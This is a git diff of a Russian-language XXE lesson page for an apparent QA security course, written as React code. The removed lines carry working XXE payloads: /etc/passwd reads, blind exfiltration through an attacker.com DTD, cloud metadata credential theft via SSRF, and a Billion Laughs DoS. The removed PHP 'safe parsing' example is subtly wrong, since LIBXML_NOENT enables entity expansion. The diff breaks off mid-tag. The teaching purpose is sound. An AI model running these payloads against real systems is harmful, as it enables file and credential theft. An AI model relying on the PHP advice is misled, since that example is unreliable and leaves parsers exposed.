@@ -3,7 +3,7 @@
 import React from 'react';
 import { ContentPageLayout } from '@/components/content/ContentPageLayout';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
-import { ExternalLink, AlertTriangle, FileCode } from 'lucide-react';
+import { ExternalLink } from 'lucide-react';
 import { QuizItem } from '@/components/content/QuizItem';
 
 const P: React.FC<React.HTMLAttributes<HTMLParagraphElement>> = ({ children, ...props }) => (
@@ -75,550 +75,350 @@ export default function Lesson6Page() {
   return (
     <ContentPageLayout
       title="Урок 6: XXE (XML External Entity)"
-      subtitle="Изучение атак XXE, методов эксплуатации и защиты от уязвимостей XML"
+      subtitle="Источник: QA Wiki — XXE"
     >
       <div className="space-y-6">
-        <Card className="border-destructive/50 bg-destructive/5">
+        <Card className="bg-blue-50 dark:bg-blue-950 border-blue-200 dark:border-blue-800">
+          <CardContent className="pt-4">
+            <P className="text-sm text-muted-foreground">
+              Источник:{' '}
+              <a 
+                href="https://innowise-group.atlassian.net/wiki/spaces/QD/pages/4041113655/XXE"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-primary hover:underline inline-flex items-center"
+              >
+                Confluence — XXE <ExternalLink className="ml-1 h-3 w-3" />
+              </a>
+            </P>
+          </CardContent>
+        </Card>
+
+        <Card>
           <CardHeader>
-            <CardTitle className="flex items-center gap-2">
-              <AlertTriangle className="h-5 w-5 text-destructive" />
-              Важное предупреждение
-            </CardTitle>
+            <CardTitle>Теория</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <P>
+              <strong>Xml eXternal Entity(XXE)</strong> — уязвимость, когда приложение парсит XML от пользователя 
+              и по ошибке позволяет этому XML ссылаться на внешние ресурсы (файлы на сервере, URL). Злоумышленник 
+              вставляет в XML специальную сущность, и парсер грузит её — например, читает <code>/etc/passwd</code> или 
+              делает запрос на внешний сервер.
+            </P>
+            <P>
+              Причина уязвимости в том, что старые или плохо настроенные XML-процессоры обрабатывают ссылки на 
+              внешние сущности внутри документов. Эти сущности могут быть использованы для доступа к внутренним 
+              файлам через обработчики URI файлов, общие папки, сканирование портов, удаленное выполнения кода и 
+              отказ в обслуживании.
+            </P>
+            <P>
+              В современных веб-приложениях все чаще и больше используются <strong>REST / GraphQL API</strong>, но 
+              по прежднему остается широко используемым форматом отправки и обработки данных. Даже если данные 
+              передаются по <strong>REST / GraphQL API</strong>, то мы можем загрузить файл, например в{' '}
+              <strong>SVG</strong> формате, <strong>XML парсер ее обработает и выполнит</strong> наш злонамерренный 
+              запрос:
+            </P>
+            <div className="bg-muted p-3 rounded-md mb-3 overflow-x-auto">
+              <pre className="text-sm">
+{`<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY secret SYSTEM "file:///etc/passwd">
+]>
+<root>&secret;</root>`}
+              </pre>
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Влияние</CardTitle>
           </CardHeader>
           <CardContent>
             <P>
-              XXE (XML External Entity) — серьезная уязвимость, которая может привести к раскрытию конфиденциальных 
-              данных, SSRF атакам, отказу в обслуживании и даже выполнению удаленного кода. Все примеры предназначены 
-              только для образовательных целей в контролируемых средах.
+              Подобные уязвимости могут использоваться для получения данных, выполнения удаленных запросов с сервера, 
+              сканирования внутренней системы, провоцирования отказа в обслуживании, а также осуществления других атак. 
+              Последствия для бизнеса зависят от критичности защиты всех уязвимых приложений и данных.
             </P>
           </CardContent>
         </Card>
 
         <Card>
           <CardHeader>
-            <CardTitle className="flex items-center gap-2">
-              <FileCode className="h-6 w-6" />
-              Что такое XXE?
-            </CardTitle>
+            <CardTitle>Существует два основных вида</CardTitle>
+          </CardHeader>
+          <CardContent>
+            <ol className="list-decimal pl-6 space-y-2">
+              <li><strong>Однополосная</strong> – загрузили сущность, один запрос = один ответ.</li>
+              <li><strong>Blind(Слепая)</strong> – загрузили сущность, она отработала на VPS сервер или Collaborator.</li>
+            </ol>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Процесс эксплуатации</CardTitle>
           </CardHeader>
           <CardContent className="space-y-4">
             <P>
-              <strong>XXE (XML External Entity injection)</strong> — это уязвимость безопасности веб-приложений, 
-              которая позволяет злоумышленнику вмешиваться в обработку XML-данных приложением. Это часто позволяет 
-              просматривать файлы в файловой системе сервера приложений и взаимодействовать с любыми внутренними 
-              или внешними системами, к которым само приложение может получить доступ.
+              Злоумышленники могут эксплуатировать уязвимые обработчики XML через загрузку XML или внедрение 
+              вредоносного контента в XML-документы, используя уязвимый код, зависимости или компоненты.
             </P>
             <P>
-              XXE атаки используют особенность XML — возможность определять внешние сущности (external entities), 
-              которые могут ссылаться на внешние источники данных через URI.
+              В целях ознакомления можно глянуть статейку{' '}
+              <a 
+                href="https://habr.com/ru/post/325270/"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-primary hover:underline inline-flex items-center"
+              >
+                https://habr.com/ru/post/325270/ <ExternalLink className="ml-1 h-3 w-3" />
+              </a>
+              , но особо время не тратим, поскольку на данном этапе нам достаточно зафиксировать наличие уязвимости 
+              без ее эксплуатации.
             </P>
             <P>
-              <strong>Потенциальные последствия XXE атак:</strong>
+              И{' '}
+              <a 
+                href="https://www.securitylab.ru/analytics/491457.php"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-primary hover:underline inline-flex items-center"
+              >
+                еще одна статья общими штрихами <ExternalLink className="ml-1 h-3 w-3" />
+              </a>
+              {' '}описывающая процесс эксплуатации уязвимости.
             </P>
-            <ul className="list-disc pl-6 mb-3 space-y-1">
-              <li>Чтение произвольных файлов на сервере</li>
-              <li>SSRF (Server-Side Request Forgery) атаки</li>
-              <li>Сканирование портов внутренней сети</li>
-              <li>Отказ в обслуживании (DoS)</li>
-              <li>В редких случаях — выполнение удаленного кода (RCE)</li>
+            <P>
+              Главная задача, как и во всех разделах – понять логику и где это может встречаться в реальных 
+              веб-приложениях. На практике возможно никогда этого и не будет. Приложения развиваются, приходят новые 
+              архитектуры и подходы. Монолит заменяется микросервисами, а REST иногда переходит в gRPC.
+            </P>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Способы поиска уязвимости</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <H3>Этап 1:</H3>
+            <P>
+              Для проверки приложения нам необходимо определить, является ли приложение уязвимым? Для этого изучаем 
+              приложение и отвечаем сами себе на ряд вопросов. Например какой <strong>Content-Type</strong> поддерживает 
+              приложение. Для этого можно использовать этот список, для простоты можно <em>"загнать"</em> его в{' '}
+              <strong>Intruder</strong>:
+            </P>
+            <ul className="list-disc pl-6 space-y-1">
+              <li><code>application/xml</code></li>
+              <li><code>text/xml</code></li>
+              <li><code>application/soap+xml</code></li>
+              <li><code>application/xhtml+xml</code></li>
+              <li><code>application/xml; charset=utf-8</code></li>
+              <li><code>text/plain</code> (чтобы проверить автодетект)</li>
+              <li><code>application/json</code> (иногда API парсит тело независимо от заголовка)</li>
+              <li><code>application/octet-stream</code></li>
+              <li><code>multipart/form-data</code> (XML как часть формы)</li>
             </ul>
-          </CardContent>
-        </Card>
-
-        <Card>
-          <CardHeader>
-            <CardTitle>Основы XML и External Entities</CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-4">
-            <H3>Что такое XML Entity?</H3>
-            <P>
-              XML entity — это способ представления данных в XML документе. Существует несколько типов сущностей:
+            <P className="mt-4">
+              Приложения и, в частности, веб-службы на основе XML или последующие интеграции могут быть уязвимы для 
+              атак, если есть один из факторов риска:
             </P>
-            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-              <pre className="text-sm">
-{`<!-- Internal Entity (Внутренняя сущность) -->
-<!DOCTYPE foo [
-  <!ENTITY myentity "my entity value">
-]>
-<root>
-  <element>&myentity;</element>
-</root>
-<!-- Результат: <element>my entity value</element> -->
-
-<!-- External Entity (Внешняя сущность) -->
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<root>
-  <element>&xxe;</element>
-</root>
-<!-- Результат: содержимое файла /etc/passwd -->`}
-              </pre>
-            </div>
-
-            <H3>Document Type Definition (DTD)</H3>
-            <P>
-              DTD определяет структуру XML документа. Именно в DTD объявляются entities:
-            </P>
-            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-              <pre className="text-sm">
-{`<!DOCTYPE название [
-  <!ELEMENT название (тип)>
-  <!ENTITY имя "значение">
-]>
-
-<!-- Пример уязвимого XML -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<stockCheck>
-  <productId>&xxe;</productId>
-  <storeId>1</storeId>
-</stockCheck>`}
-              </pre>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card>
-          <CardHeader>
-            <CardTitle>Типы XXE атак</CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-6">
-            <div>
-              <H2>1. Classic XXE (Чтение файлов)</H2>
-              <P>
-                Самый простой тип XXE, где содержимое внешней сущности возвращается в ответе приложения.
-              </P>
-              <H3>Пример атаки</H3>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`<!-- Оригинальный запрос -->
-<?xml version="1.0" encoding="UTF-8"?>
-<stockCheck>
-  <productId>381</productId>
-  <storeId>29</storeId>
-</stockCheck>
-
-<!-- XXE атака -->
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<stockCheck>
-  <productId>&xxe;</productId>
-  <storeId>29</storeId>
-</stockCheck>
-
-<!-- Чтение файлов Windows -->
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
-]>
-
-<!-- Чтение произвольных файлов -->
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
-]>`}
-                </pre>
-              </div>
-
-              <H3>Чтение файлов через PHP wrapper</H3>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-]>
-<root>
-  <data>&xxe;</data>
-</root>
-
-<!-- Результат будет закодирован в base64, что позволяет читать бинарные файлы -->`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H2>2. Blind XXE</H2>
-              <P>
-                <strong>Blind XXE</strong> возникает, когда приложение уязвимо к XXE, но не возвращает значения 
-                внешних сущностей в своих ответах.
-              </P>
-
-              <H3>2.1 Blind XXE через Out-of-band (OAST)</H3>
-              <P>Использование внешнего сервера для получения данных:</P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`<!-- Базовое обнаружение через DNS -->
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
-]>
-<root>
-  <data>&xxe;</data>
-</root>
-
-<!-- Злоумышленник увидит запрос к attacker.com, подтверждающий уязвимость -->
-
-<!-- Извлечение данных через DNS -->
-<!DOCTYPE foo [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
-  %dtd;
-]>
-<root>&send;</root>
-
-<!-- Файл evil.dtd на attacker.com: -->
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
-%all;`}
-                </pre>
-              </div>
-
-              <H3>2.2 Blind XXE через Error Messages</H3>
-              <P>Вызов ошибки парсинга, которая содержит желаемые данные:</P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`<!DOCTYPE foo [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-  %eval;
-  %error;
-]>
-
-<!-- Ошибка парсера может содержать содержимое /etc/passwd -->`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H2>3. XXE для SSRF</H2>
-              <P>
-                XXE можно использовать для выполнения Server-Side Request Forgery атак:
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`<!-- Сканирование внутренних портов -->
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://192.168.1.1:22">
-]>
-<root>&xxe;</root>
-
-<!-- Доступ к метаданным облачных сервисов -->
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
-]>
-
-<!-- AWS metadata -->
-<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
-
-<!-- Google Cloud metadata -->
-<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
-
-<!-- Azure metadata -->
-<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H2>4. XXE для DoS</H2>
-              <P>
-                <strong>Billion Laughs Attack</strong> — классическая DoS атака через XXE:
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`<!DOCTYPE lolz [
-  <!ENTITY lol "lol">
-  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
-  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
-  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
-  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
-  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
-  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
-  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
-]>
-<lolz>&lol9;</lolz>
-
-<!-- Эта атака расширяется до ~3 миллиардов "lol" и вызывает истощение памяти -->`}
-                </pre>
-              </div>
-            </div>
-
-            <div>
-              <H2>5. XInclude атаки</H2>
-              <P>
-                Когда невозможно модифицировать DOCTYPE, можно использовать XInclude:
-              </P>
-              <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-                <pre className="text-sm">
-{`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>`}
-                </pre>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card>
-          <CardHeader>
-            <CardTitle>Обнаружение XXE</CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-4">
-            <H3>1. Обнаружение через внешние сущности</H3>
-            <P>Самый простой способ — попытаться определить внешнюю сущность:</P>
-            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-              <pre className="text-sm">
-{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://your-server.com/xxe-test">]>
-<root>&xxe;</root>
-
-<!-- Если приложение уязвимо, вы получите HTTP запрос на your-server.com -->`}
-              </pre>
-            </div>
-
-            <H3>2. Использование Burp Collaborator</H3>
-            <P>Burp Suite предоставляет встроенный Collaborator сервер:</P>
-            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-              <pre className="text-sm">
-{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burp-collaborator-subdomain.burpcollaborator.net">]>
-<root>&xxe;</root>
-
-<!-- Проверьте Burp Collaborator на наличие входящих запросов -->`}
-              </pre>
-            </div>
-
-            <H3>3. Проверка различных Content-Type</H3>
-            <P>Попробуйте изменить Content-Type на:</P>
-            <ul className="list-disc pl-6 mb-3 space-y-1">
-              <li><code className="bg-muted px-1 py-0.5 rounded">application/xml</code></li>
-              <li><code className="bg-muted px-1 py-0.5 rounded">text/xml</code></li>
-              <li><code className="bg-muted px-1 py-0.5 rounded">application/x-www-form-urlencoded</code> (можно преобразовать в XML)</li>
-            </ul>
-
-            <H3>4. Тестирование file upload</H3>
-            <P>Загрузка SVG, DOCX, XLSX файлов (они содержат XML):</P>
-            <div className="bg-muted p-4 rounded-md mb-3 overflow-x-auto">
-              <pre className="text-sm">
-{`<!-- malicious.svg -->
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
-  <text font-size="16" x="0" y="16">&xxe;</text>
-</svg>`}
-              </pre>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card>
-          <CardHeader>
-            <CardTitle>Методы защиты от XXE</CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-4">
-            <div>
-              <H3>1. Отключение внешних сущностей (Наиболее эффективно)</H3>
-              <P>Отключите обработку внешних сущностей в XML парсере:</P>
-
-              <div className="mb-4">
-                <p className="font-semibold mb-2">PHP (libxml)</p>
-                <div className="bg-muted p-4 rounded-md overflow-x-auto">
-                  <pre className="text-sm">
-{`// Отключить загрузку внешних сущностей
-libxml_disable_entity_loader(true);
-
-// Использовать флаги при загрузке
-$dom = new DOMDocument();
-$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
-
-// Лучший вариант - использовать SimpleXML безопасно:
-$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NOENT);`}
-                  </pre>
-                </div>
-              </div>
-
-              <div className="mb-4">
-                <p className="font-semibold mb-2">Java (DocumentBuilderFactory)</p>
-                <div className="bg-muted p-4 rounded-md overflow-x-auto">
-                  <pre className="text-sm">
-{`DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
-
-// Отключить DTDs полностью
-dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
-
-// Если нельзя отключить DTDs полностью:
-dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
-dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
-dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
-
-// Отключить XInclude
-dbf.setXIncludeAware(false);
-
-// Отключить expansion of entity references
-dbf.setExpandEntityReferences(false);`}
-                  </pre>
-                </div>
-              </div>
-
-              <div className="mb-4">
-                <p className="font-semibold mb-2">Python (lxml)</p>
-                <div className="bg-muted p-4 rounded-md overflow-x-auto">
-                  <pre className="text-sm">
-{`from lxml import etree
-
-# Безопасный парсер
-parser = etree.XMLParser(
-    resolve_entities=False,
-    no_network=True,
-    dtd_validation=False,
-    load_dtd=False
-)
-
-doc = etree.fromstring(xml_data, parser)
-
-# Или используйте defusedxml:
-import defusedxml.ElementTree as ET
-tree = ET.parse('data.xml')`}
-                  </pre>
-                </div>
-              </div>
-
-              <div className="mb-4">
-                <p className="font-semibold mb-2">Node.js (libxmljs)</p>
-                <div className="bg-muted p-4 rounded-md overflow-x-auto">
-                  <pre className="text-sm">
-{`const libxmljs = require("libxmljs");
-
-// Безопасный парсинг
-const xmlDoc = libxmljs.parseXml(xmlString, {
-    noent: false,
-    nonet: true,
-    dtdload: false,
-    dtdvalid: false
-});`}
-                  </pre>
-                </div>
-              </div>
-
-              <div className="mb-4">
-                <p className="font-semibold mb-2">.NET</p>
-                <div className="bg-muted p-4 rounded-md overflow-x-auto">
-                  <pre className="text-sm">
-{`XmlReaderSettings settings = new XmlReaderSettings();
-settings.DtdProcessing = DtdProcessing.Prohibit;
-settings.XmlResolver = null;
-
-using (XmlReader reader = XmlReader.Create(stream, settings))
-{
-    XmlDocument doc = new XmlDocument();
-    doc.Load(reader);
-}`}
-                  </pre>
-                </div>
-              </div>
-            </div>
-
-            <div>
-              <H3>2. Использование менее сложных форматов данных</H3>
-              <P>Везде, где возможно, используйте более простые форматы:</P>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>JSON вместо XML</li>
-                <li>YAML (с осторожностью)</li>
-                <li>CSV для простых данных</li>
-              </ul>
-            </div>
-
-            <div>
-              <H3>3. Валидация входных данных</H3>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>Валидация XML против XSD (XML Schema)</li>
-                <li>Белый список разрешенных элементов и атрибутов</li>
-                <li>Проверка на наличие DOCTYPE в XML</li>
-              </ul>
-            </div>
-
-            <div>
-              <H3>4. Обновление зависимостей</H3>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>Регулярно обновляйте XML парсеры</li>
-                <li>Используйте зависимости с известными безопасными настройками</li>
-                <li>Мониторьте CVE для используемых библиотек</li>
-              </ul>
-            </div>
-
-            <div>
-              <H3>5. Web Application Firewall (WAF)</H3>
-              <P>Настройте WAF для обнаружения XXE паттернов:</P>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>Блокировка DOCTYPE declarations</li>
-                <li>Блокировка ENTITY declarations</li>
-                <li>Блокировка file:// и http:// в XML</li>
-              </ul>
-            </div>
-
-            <div>
-              <H3>6. Принцип наименьших привилегий</H3>
-              <ul className="list-disc pl-6 mb-3 space-y-1">
-                <li>Запускайте приложение под пользователем с минимальными правами</li>
-                <li>Ограничьте доступ к файловой системе</li>
-                <li>Ограничьте исходящие соединения</li>
-              </ul>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card>
-          <CardHeader>
-            <CardTitle>Практические лаборатории</CardTitle>
-          </CardHeader>
-          <CardContent className="space-y-4">
-            <P>
-              Рекомендуемые платформы для практики XXE:
-            </P>
-            <ul className="list-disc pl-6 space-y-2">
+            <ol className="list-decimal pl-6 space-y-2">
               <li>
-                <strong>PortSwigger Web Security Academy - XXE</strong>
-                <a 
-                  href="https://portswigger.net/web-security/xxe" 
-                  target="_blank" 
-                  rel="noopener noreferrer"
-                  className="inline-flex items-center ml-2 text-primary hover:underline"
-                >
-                  Перейти к лабораториям <ExternalLink className="ml-1 h-4 w-4" />
-                </a>
-                <div className="ml-4 mt-2 text-sm text-muted-foreground">
-                  Рекомендуемые лабораторные работы:
-                  <ol className="list-decimal pl-6 mt-2 space-y-1">
-                    <li>Exploiting XXE using external entities to retrieve files</li>
-                    <li>Exploiting XXE to perform SSRF attacks</li>
-                    <li>Blind XXE with out-of-band interaction</li>
-                    <li>Blind XXE with out-of-band interaction via XML parameter entities</li>
-                    <li>Exploiting blind XXE to exfiltrate data using a malicious external DTD</li>
-                  </ol>
-                </div>
+                Приложение принимает XML напрямую или загружает XML, особенно из ненадежных источников, или вставляет 
+                ненадежные данные в документы XML, которые затем анализируются процессором XML.
               </li>
-              <li><strong>DVWA (Damn Vulnerable Web Application)</strong> - XXE модуль</li>
-              <li><strong>WebGoat</strong> - XXE lessons</li>
-              <li><strong>HackTheBox</strong> - Machines с XXE уязвимостями</li>
-              <li><strong>TryHackMe</strong> - XXE комнаты</li>
-            </ul>
+              <li>
+                Для любого из процессоров XML в приложении или веб-службах на основе SOAP включены определения типов 
+                документов (DTD).
+              </li>
+              <li>
+                Если приложение использует SAML для обработки идентификаторов в целях федеративной безопасности или 
+                единого входа (SSO). SAML использует XML для подтверждения личности и может быть уязвимым.
+              </li>
+              <li>
+                Если приложение использует SOAP до версии 1.2, оно может быть подвержено атакам XXE, если сущности 
+                XML передаются в инфраструктуру SOAP.
+              </li>
+              <li>
+                Вероятность уязвимости к атакам XXE означает, что приложение уязвимо для атак отказа в обслуживании, 
+                включая атаку{' '}
+                <a 
+                  href="https://en.wikipedia.org/wiki/Billion_laughs_attack"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="text-primary hover:underline inline-flex items-center"
+                >
+                  https://en.wikipedia.org/wiki/Billion_laughs_attack <ExternalLink className="ml-1 h-3 w-3" />
+                </a>
+              </li>
+            </ol>
+
+            <H3 className="mt-6">Этап 2:</H3>
+            <P>
+              Следующий шаг для тестирования приложения на наличие уязвимости инъекции XML состоит в попытке вставить 
+              метасимволы в XML и таким образом повлиять на содержимое этого документа, в случае наличия DDT схемы нужно 
+              не забывать что итоговый документ должен быть валидным для этой схемы иначе он не подойдет под DDT схему и 
+              будет ошибка валидации документа, но это не означает что приложение уязвимо к атаке данного типа.
+            </P>
+            <P>
+              <strong>Метасимволы XML:</strong> <code>', " , {'<>'}, {'<!--/-->'}, &, {'<![CDATA[ / ]]>'}, XXE, TAG</code> - 
+              это набор метасимволов, которые могут помочь в выявлении потенциальных уязвимостей.
+            </P>
+            <P>
+              По завершении этого шага тестер получит некоторую информацию о структуре XML-документа.
+            </P>
+            <P>
+              Можно проверять вставляя в документ уже написанные пейлоады, например{' '}
+              <a 
+                href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-primary hover:underline inline-flex items-center"
+              >
+                AllTheThings <ExternalLink className="ml-1 h-3 w-3" />
+              </a>
+              {' '}которые лежат в интернете. Но помним, что тут вам требуется понимание того как в вашей системе 
+              устроена работа с XMLфайлами.
+            </P>
           </CardContent>
         </Card>
 
         <Card>
           <CardHeader>
-            <CardTitle>Инструменты для тестирования XXE</CardTitle>
+            <CardTitle>Способы защиты от XXE</CardTitle>
           </CardHeader>
           <CardContent>
-            <ul className="list-disc pl-6 space-y-2">
-              <li><strong>Burp Suite Professional</strong> - Burp Collaborator для out-of-band тестирования</li>
-              <li><strong>OWASP ZAP</strong> - Автоматическое сканирование XXE</li>
-              <li><strong>XXEinjector</strong> - Специализированный инструмент для XXE</li>
-              <li><strong>Interactsh</strong> - Open-source альтернатива Burp Collaborator</li>
-              <li><strong>RequestBin / Webhook.site</strong> - Для захвата out-of-band запросов</li>
-            </ul>
+            <ol className="list-decimal pl-6 space-y-3">
+              <li>
+                По возможности используйте менее сложные форматы данных, такие как JSON, и избегайте сериализации 
+                конфиденциальных данных.
+              </li>
+              <li>
+                Исправьте или обновите все процессоры и библиотеки XML, используемые приложением или в базовой 
+                операционной системе. Используйте проверки зависимостей. Обновите SOAP до SOAP 1.2 или выше.
+              </li>
+              <li>
+                Отключите внешнюю сущность XML и обработку DTD во всех синтаксических анализаторах XML в приложении.
+              </li>
+              <li>
+                Реализуйте положительную («белый список») проверку, фильтрацию или очистку входных данных на стороне 
+                сервера, чтобы предотвратить враждебные данные в документах, заголовках или узлах XML.
+              </li>
+              <li>
+                Убедитесь, что функция загрузки файлов XML или XSL проверяет входящий XML с использованием проверки 
+                XSD или аналогичной.
+              </li>
+              <li>
+                Инструменты SAST могут помочь обнаружить XXE в исходном коде, хотя ручная проверка кода — лучшая 
+                альтернатива для больших и сложных приложений со многими интеграциями.
+              </li>
+              <li>
+                Если эти элементы управления невозможны, рассмотрите возможность использования виртуальных исправлений, 
+                шлюзов безопасности API или брандмауэров веб-приложений (WAF) для обнаружения, мониторинга и блокирования 
+                атак XXE.
+              </li>
+            </ol>
+          </CardContent>
+        </Card>
+
+        <Card>
+          <CardHeader>
+            <CardTitle>Домашнее задание</CardTitle>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            <P>
+              Пройти теорию на{' '}
+              <a 
+                href="https://portswigger.net/web-security/xxe"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-primary hover:underline inline-flex items-center"
+              >
+                Portswigger <ExternalLink className="ml-1 h-3 w-3" />
+              </a>
+              {' '}и дополнительно ответить себе на вопросы{' '}
+              <a 
+                href="https://portswigger.net/web-security/all-materials"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-primary hover:underline inline-flex items-center"
+              >
+                тут <ExternalLink className="ml-1 h-3 w-3" />
+              </a>
+              . А после переходим к:
+            </P>
+            <ol className="list-decimal pl-6 space-y-2">
+              <li>
+                <a 
+                  href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="text-primary hover:underline inline-flex items-center"
+                >
+                  Exploiting XXE using external entities to retrieve files <ExternalLink className="ml-1 h-3 w-3" />
+                </a>
+              </li>
+              <li>
+                <a 
+                  href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="text-primary hover:underline inline-flex items-center"
+                >
+                  Exploiting XXE to perform SSRF attacks <ExternalLink className="ml-1 h-3 w-3" />
+                </a>
+              </li>
+              <li>
+                <a 
+                  href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="text-primary hover:underline inline-flex items-center"
+                >
+                  Exploiting blind XXE to retrieve data via error messages <ExternalLink className="ml-1 h-3 w-3" />
+                </a>
+              </li>
+              <li>
+                <a 
+                  href="https://portswigger.net/web-security/xxe/lab-xinclude-attack"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="text-primary hover:underline inline-flex items-center"
+                >
+                  Exploiting XInclude to retrieve files <ExternalLink className="ml-1 h-3 w-3" />
+                </a>
+              </li>
+              <li>
+                <a 
+                  href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="text-primary hover:underline inline-flex items-center"
